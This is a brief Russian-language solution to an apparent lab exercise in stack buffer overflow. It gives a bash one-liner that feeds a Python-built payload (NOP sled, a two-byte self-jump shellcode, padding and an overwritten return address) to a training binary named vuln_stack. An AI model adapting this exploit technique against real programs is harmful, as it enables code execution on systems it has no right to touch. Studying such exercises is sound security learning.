
Фактически нужно просто подложить код, который будет jmp на начало своего исполнения

Смещения взял из задания 1

```bash
./vuln_stack "$(python3 -c '
import sys
sc = b"\xeb\xfe"
payload = b"\x90"*80 + sc + b"A"*(112 - 80 - len(sc)) + b"\x84\xbe\xff\xff"
sys.stdout.buffer.write(payload)
')"
```